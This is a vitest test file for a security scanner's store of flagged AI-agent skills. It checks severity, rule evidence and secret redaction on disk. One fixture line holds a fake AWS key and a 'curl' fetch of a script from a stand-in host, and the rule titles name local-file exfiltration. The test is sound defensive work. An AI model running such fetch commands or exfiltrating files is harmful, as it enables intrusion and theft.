/**
 * Flagged-skills store: the durable scan verdict that `pga status` / `pga doctor`
 * read so a scanned-dangerous skill shows its real severity instead of "UNKNOWN".
 */
import { describe, it, expect, afterEach } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
  recordScanResults,
  readFlaggedSkills,
  readFlaggedStore,
  lastScanAt,
  clearFlaggedSkill,
  flaggedSkillsPath,
} from '../src/cli/flagged-skills.js';

let dir: string | undefined;
afterEach(() => {
  if (dir) {
    rmSync(dir, { recursive: true, force: true });
    dir = undefined;
  }
});
const sandbox = (): string => {
  dir = mkdtempSync(join(tmpdir(), 'pg-flagged-'));
  return dir;
};

describe('flagged-skills store', () => {
  it('records a flagged skill with its real severity + a scan timestamp', () => {
    const d = sandbox();
    recordScanResults({
      dataDir: d,
      scannedNames: ['note-taker', 'repo-helper'],
      flagged: [{ name: 'repo-helper', platform: 'claude-code', riskLevel: 'CRITICAL' }],
      scannedAt: '2026-07-07T00:00:00.000Z',
    });
    const flagged = readFlaggedSkills(d);
    expect(flagged).toHaveLength(1);
    expect(flagged[0]).toMatchObject({
      name: 'repo-helper',
      normalizedName: 'repo-helper',
      platform: 'claude-code',
      riskLevel: 'CRITICAL',
    });
    expect(lastScanAt(d)).toBe('2026-07-07T00:00:00.000Z');
    // Persisted 0600 next to the whitelist.
    expect(existsSync(flaggedSkillsPath(d))).toBe(true);
  });

  it('re-scanning a now-clean skill DROPS its prior flag (verdict is authoritative)', () => {
    const d = sandbox();
    recordScanResults({
      dataDir: d,
      scannedNames: ['repo-helper'],
      flagged: [{ name: 'repo-helper', platform: 'claude-code', riskLevel: 'CRITICAL' }],
      scannedAt: '2026-07-07T00:00:00.000Z',
    });
    expect(readFlaggedSkills(d)).toHaveLength(1);
    // User fixes the skill; a re-scan finds it clean.
    recordScanResults({
      dataDir: d,
      scannedNames: ['repo-helper'],
      flagged: [],
      scannedAt: '2026-07-07T01:00:00.000Z',
    });
    expect(readFlaggedSkills(d)).toHaveLength(0);
    expect(lastScanAt(d)).toBe('2026-07-07T01:00:00.000Z');
  });

  it("a scan that did NOT look at a skill keeps that skill's prior flag", () => {
    const d = sandbox();
    recordScanResults({
      dataDir: d,
      scannedNames: ['repo-helper'],
      flagged: [{ name: 'repo-helper', platform: 'claude-code', riskLevel: 'CRITICAL' }],
      scannedAt: '2026-07-07T00:00:00.000Z',
    });
    // A later scan of a DIFFERENT skill must not clear repo-helper's flag.
    recordScanResults({
      dataDir: d,
      scannedNames: ['other-skill'],
      flagged: [{ name: 'other-skill', platform: 'claude-code', riskLevel: 'HIGH' }],
      scannedAt: '2026-07-07T02:00:00.000Z',
    });
    const names = readFlaggedSkills(d)
      .map((f) => f.name)
      .sort();
    expect(names).toEqual(['other-skill', 'repo-helper']);
  });

  it('is immutable: recording does not mutate the previously-returned array', () => {
    const d = sandbox();
    recordScanResults({
      dataDir: d,
      scannedNames: ['a'],
      flagged: [{ name: 'a', platform: 'claude-code', riskLevel: 'HIGH' }],
      scannedAt: '2026-07-07T00:00:00.000Z',
    });
    const first = readFlaggedSkills(d);
    recordScanResults({
      dataDir: d,
      scannedNames: ['b'],
      flagged: [{ name: 'b', platform: 'claude-code', riskLevel: 'CRITICAL' }],
      scannedAt: '2026-07-07T01:00:00.000Z',
    });
    // The array captured earlier is unchanged (a fresh read reflects the update).
    expect(first).toHaveLength(1);
    expect(first[0]?.name).toBe('a');
    expect(readFlaggedSkills(d)).toHaveLength(2);
  });

  it('clearFlaggedSkill removes one skill by name, leaving lastScanAt intact', () => {
    const d = sandbox();
    recordScanResults({
      dataDir: d,
      scannedNames: ['a', 'b'],
      flagged: [
        { name: 'a', platform: 'claude-code', riskLevel: 'HIGH' },
        { name: 'b', platform: 'claude-code', riskLevel: 'CRITICAL' },
      ],
      scannedAt: '2026-07-07T00:00:00.000Z',
    });
    clearFlaggedSkill('A', d); // case-insensitive
    const names = readFlaggedSkills(d).map((f) => f.name);
    expect(names).toEqual(['b']);
    expect(lastScanAt(d)).toBe('2026-07-07T00:00:00.000Z');
  });

  it('tolerates an absent or corrupt store file', () => {
    const d = sandbox();
    expect(readFlaggedStore(d)).toEqual({ lastScanAt: null, flagged: [] });
    writeFileSync(flaggedSkillsPath(d), '{ not json', 'utf-8');
    expect(readFlaggedStore(d)).toEqual({ lastScanAt: null, flagged: [] });
    expect(readFileSync(flaggedSkillsPath(d), 'utf-8')).toBe('{ not json'); // never clobbered on read
  });
});

/**
 * Evidence layer: WHY a skill was flagged, not just THAT it was.
 *
 * Before this, the store kept only `riskLevel`, so `pga status` could report a
 * CRITICAL skill but could not say which rule fired or where — leaving the user
 * with blind obedience or a manual re-audit of every flagged skill. The scan
 * already computes rule id / title / severity / location; it was being dropped
 * on the way to disk.
 */
describe('flagged-skills evidence', () => {
  it('persists which rule fired and where, alongside the verdict', () => {
    const d = sandbox();
    recordScanResults({
      dataDir: d,
      scannedNames: ['repo-helper'],
      flagged: [
        {
          name: 'repo-helper',
          platform: 'claude-code',
          riskLevel: 'CRITICAL',
          evidence: [
            {
              ruleId: 'ATR-2026-00162',
              title: 'Outbound copy of local files in skill instructions',
              severity: 'critical',
            },
          ],
        },
      ],
      scannedAt: '2026-07-19T00:00:00.000Z',
    });
    const [skill] = readFlaggedSkills(d);
    expect(skill?.evidence).toEqual([
      {
        ruleId: 'ATR-2026-00162',
        title: 'Outbound copy of local files in skill instructions',
        severity: 'critical',
      },
    ]);
  });

  it('NEVER writes a matched snippet to disk (secret discipline)', () => {
    const d = sandbox();
    // A snippet is the raw matched source line. When the rule that matched is a
    // secret-detection rule, that line IS the secret — and this store lives on
    // disk indefinitely. The marker below stands in for such a line.
    const RAW_MATCHED_LINE = 'MATCHED-SOURCE-LINE-MUST-NOT-BE-PERSISTED';
    recordScanResults({
      dataDir: d,
      scannedNames: ['leaky'],
      flagged: [
        {
          name: 'leaky',
          platform: 'claude-code',
          riskLevel: 'CRITICAL',
          evidence: [
            {
              ruleId: 'ATR-2026-00113',
              title: 'Hardcoded credential',
              severity: 'critical',
              location: 'SKILL.md:3',
              snippet: RAW_MATCHED_LINE,
            } as never,
          ],
        },
      ],
      scannedAt: '2026-07-19T00:00:00.000Z',
    });
    const raw = readFileSync(flaggedSkillsPath(d), 'utf-8');
    expect(raw).not.toContain(RAW_MATCHED_LINE);
    expect(raw).not.toContain('snippet');
    const [skill] = readFlaggedSkills(d);
    expect(skill?.evidence?.[0]).not.toHaveProperty('snippet');
    expect(skill?.evidence?.[0]?.ruleId).toBe('ATR-2026-00113');
  });

  it('caps stored evidence so one noisy skill cannot bloat the store', () => {
    const d = sandbox();
    recordScanResults({
      dataDir: d,
      scannedNames: ['noisy'],
      flagged: [
        {
          name: 'noisy',
          platform: 'claude-code',
          riskLevel: 'HIGH',
          evidence: Array.from({ length: 40 }, (_, i) => ({
            ruleId: `ATR-2026-${String(i).padStart(5, '0')}`,
            title: `finding ${i}`,
            severity: 'high',
          })),
        },
      ],
      scannedAt: '2026-07-19T00:00:00.000Z',
    });
    const [skill] = readFlaggedSkills(d);
    expect(skill?.evidence?.length).toBeLessThanOrEqual(5);
    // Keeps the FIRST findings (the auditor orders by severity).
    expect(skill?.evidence?.[0]?.ruleId).toBe('ATR-2026-00000');
  });

  it('reads a pre-evidence store written by an older version', () => {
    const d = sandbox();
    writeFileSync(
      flaggedSkillsPath(d),
      JSON.stringify({
        lastScanAt: '2026-07-01T00:00:00.000Z',
        flagged: [
          {
            name: 'old',
            normalizedName: 'old',
            platform: 'claude-code',
            riskLevel: 'CRITICAL',
            scannedAt: '2026-07-01T00:00:00.000Z',
          },
        ],
      }),
      'utf-8'
    );
    const [skill] = readFlaggedSkills(d);
    expect(skill?.name).toBe('old');
    expect(skill?.evidence).toBeUndefined();
  });

  it('drops evidence when a re-scan clears the skill', () => {
    const d = sandbox();
    recordScanResults({
      dataDir: d,
      scannedNames: ['repo-helper'],
      flagged: [
        {
          name: 'repo-helper',
          platform: 'claude-code',
          riskLevel: 'CRITICAL',
          evidence: [{ ruleId: 'ATR-2026-00162', title: 'x', severity: 'critical' }],
        },
      ],
      scannedAt: '2026-07-19T00:00:00.000Z',
    });
    recordScanResults({
      dataDir: d,
      scannedNames: ['repo-helper'],
      flagged: [],
      scannedAt: '2026-07-19T01:00:00.000Z',
    });
    expect(readFlaggedSkills(d)).toHaveLength(0);
  });

  it('drops `location`, which for ATR findings carries the matched text', () => {
    const d = sandbox();
    // ATR reports location as "Matched: <raw text that tripped the rule>", so a
    // credential rule hands over the credential. The live `--verbose` view may
    // show a user their own file; this long-lived store must not keep it.
    const MATCHED_TEXT = `Matched: AKIA${'A'.repeat(16)}, curl http://x.example/a.sh`;
    recordScanResults({
      dataDir: d,
      scannedNames: ['leaky'],
      flagged: [
        {
          name: 'leaky',
          platform: 'claude-code',
          riskLevel: 'CRITICAL',
          evidence: [
            {
              ruleId: 'ATR-2026-00113',
              title: 'Hardcoded credential',
              severity: 'critical',
              location: MATCHED_TEXT,
            } as never,
          ],
        },
      ],
      scannedAt: '2026-07-19T00:00:00.000Z',
    });
    const raw = readFileSync(flaggedSkillsPath(d), 'utf-8');
    expect(raw).not.toContain(`AKIA${'A'.repeat(16)}`);
    expect(raw).not.toContain('location');
    // Still enough to triage: the rule id survives, and it is public YAML.
    expect(readFlaggedSkills(d)[0]?.evidence?.[0]?.ruleId).toBe('ATR-2026-00113');
  });

  it('discards malformed evidence rather than failing the scan', () => {
    const d = sandbox();
    recordScanResults({
      dataDir: d,
      scannedNames: ['weird'],
      flagged: [
        {
          name: 'weird',
          platform: 'claude-code',
          riskLevel: 'HIGH',
          evidence: [null, 42, { title: 'kept', severity: 'high' }, { severity: 'high' }] as never,
        },
      ],
      scannedAt: '2026-07-19T00:00:00.000Z',
    });
    const [skill] = readFlaggedSkills(d);
    expect(skill?.evidence).toEqual([{ title: 'kept', severity: 'high' }]);
  });
});
